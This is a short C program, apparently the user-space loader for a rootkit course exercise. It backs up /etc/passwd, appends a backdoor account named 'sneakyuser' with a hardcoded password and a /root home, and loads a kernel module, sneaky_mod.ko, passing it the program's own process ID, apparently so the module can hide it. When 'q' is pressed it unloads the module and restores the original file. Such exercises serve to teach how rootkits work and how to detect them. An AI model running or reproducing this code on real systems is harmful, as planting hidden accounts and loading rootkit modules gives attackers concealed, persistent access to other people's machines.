#include <stdio.h>
#include <stdlib.h>


int main() {
  printf("sneaky_process pid=%d\n", getpid());
  system("cp /etc/passwd /tmp");
  system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n' >> "
         "/etc/passwd");
  char arg[50];
  sprintf(arg, "insmod sneaky_mod.ko sneaky_pid=%d", (int)getpid());
  system(arg);

  char c;
  while ((c = getchar()) != 'q') {
  }

  system("rmmod sneaky_mod.ko");
  system("cp /tmp/passwd /etc");
  system("rm /tmp/passwd");
  return EXIT_SUCCESS;
}